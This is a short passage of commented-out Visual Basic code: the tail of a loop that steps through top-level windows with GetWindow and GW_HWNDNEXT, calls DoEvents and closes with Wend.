  '      CurrWnd = GetWindow(CurrWnd, GW_HWNDNEXT)
  '      DoEvents

  '  Wend
    
